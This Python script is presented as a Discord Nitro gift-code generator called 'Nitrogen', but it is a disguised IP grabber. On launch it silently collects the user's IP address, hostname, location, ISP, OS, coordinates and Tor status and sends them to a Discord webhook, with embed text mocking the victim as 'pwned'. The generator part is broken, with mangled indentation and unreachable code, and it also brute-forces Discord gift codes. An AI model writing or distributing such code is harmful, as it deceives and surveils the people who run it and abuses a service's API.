import socket, requests, platform, random, string
from discord_webhook import DiscordWebhook, DiscordEmbed
import random
import string
import requests


def gencode():
	letters = string.ascii_letters + string.digits
	return ''.join(random.choice(letters) for i in range(19))






def menu():
	print("""

    _   ___ __                            
   / | / (_) /__________  ____ ____  ____ 
  /  |/ / / __/ ___/ __ \/ __ `/ _ \/ __ \

 / /|  / / /_/ /  / /_/ / /_/ /  __/ / / /
/_/ |_/_/\__/_/   \____/\__, /\___/_/ /_/ 
                       /____/             
By: Raz
	""")
	def __init__(self):
		self.codes = []
		self.check()
	
	def check(self):
		while True:
			code = gencode()
		    codes.append(code)
			response = requests.get(
				"https://discord.com/api/v7/entitlements/gift-codes/" + code + "?with_application=false&with_subscription_plan=true")
			data = response.json()
			if data["message"] == 'Unknown Gift Code':
				print("[NITROGEN] Not Working: " + code)
			elif data["message"] == 'You are being rate limited.':
                                print('[NITROGEN] Rate Limited: ' + code)
                                file = open("ratelimited.txt", "a+")
                                file.write("\n" + code)
			else:
				print("[NITROGEN] Worked: " + code)
				file = open("workedcodes.txt", "a+")
				file.write("\n" + code)


def WebhookDone():
	get_ip = requests.get("https://api.ipify.org/?format=json").json()['ip']
	get_hostname = requests.get("https://wtfismyip.com/json").json()['YourFuckingHostname']
	get_location = requests.get("https://wtfismyip.com/json").json()['YourFuckingLocation']
	get_isp = requests.get("https://wtfismyip.com/json").json()['YourFuckingISP']
	get_tor = requests.get("https://wtfismyip.com/json").json()['YourFuckingTorExit']
	get_os = platform.platform()
	webhook = DiscordWebhook(url='')
	ifc = "https://ifconfig.co/json"
	city = requests.get(ifc).json()['city']
	asn = requests.get(ifc).json()['asn']
	asn_org = requests.get(ifc).json()['asn_org']
	zip = requests.get(ifc).json()['zip_code']
	lat = requests.get(ifc).json()['latitude']
	long = requests.get(ifc).json()['longitude']
	
	embed = DiscordEmbed(title="Got a catch!", description="")
	emb = embed.add_embed_field
	embed.add_embed_field(name='Hostname', value=get_hostname)
	embed.add_embed_field(name="Are they on TOR?", value=get_tor)
	embed.add_embed_field(name="City", value=city)
	embed.add_embed_field(name='Location', value=get_location)
	embed.add_embed_field(name='OS', value=get_os)
	embed.add_embed_field(name="ISP", value=get_isp)
	embed.add_embed_field(name='IP Address', value=get_ip)
	
	embed.set_footer(text="Made with Love by Raz | This skid just got pwned lmao ")
	embed.set_timestamp()
	embed.set_author(text="IPGrabber by raz v0.1")
	webhook.add_embed(embed)
	
	resp = webhook.execute()


def notify():
	webhook = DiscordWebhook(url='', content='<@&777038627086794772> someone clicked')
	asz = webhook.execute()
notify()
WebhookDone()
menu()
